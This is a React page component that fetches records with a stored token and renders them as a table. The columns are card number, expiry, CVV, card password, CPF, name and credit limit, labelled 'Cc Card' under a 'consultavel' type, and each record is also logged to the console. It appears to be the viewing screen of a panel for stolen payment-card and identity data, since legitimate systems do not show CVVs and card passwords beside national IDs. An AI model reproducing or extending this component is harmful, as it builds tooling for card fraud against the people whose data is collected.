import React from 'react';
import Styles from './ConsultavelInfoPage.module.css';
import Loading from '../../../../../Partials/Loading';

import { GlobalContext } from '../../../../../../../GloblStorage';
import ConsultavelInfo from './components/ConsultavelInfo';

const ConsultavelInfoPage = () => {
  const [data, setData] = React.useState(null);
  const [loading, setLoading] = React.useState(null);

  const Global = React.useContext(GlobalContext);

  React.useEffect(() => {
    async function getDatas() {
      try {
        let token = localStorage.getItem('token');
        setLoading(true);
        const response = await fetch(Global.url + '/getInfos', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ type: 'consultavel', token })
        });
        const json = await response.json();
        setData(json);
      } catch {
      } finally {
        setLoading(false);
      }
    }

    getDatas();
  }, [Global]);

  return (
    <div className={Styles.container}>
      {data && (
        <>
          <div className={Styles.titles}>
            <div></div>
            <div>Loja</div>
            <div>Numero</div>
            <div>Validade</div>
            <div>CVV</div>
            <div>Senha</div>
            <div>CPF</div>
            <div>Nome</div>
            <div>Limite</div>
          </div>
          {data.reverse().map((card) => {
            console.log(card);
            return <ConsultavelInfo {...card} key={card.id} type="Cc Card" />;
          })}
        </>
      )}
      {loading && <Loading />}
    </div>
  );
};

export default ConsultavelInfoPage;
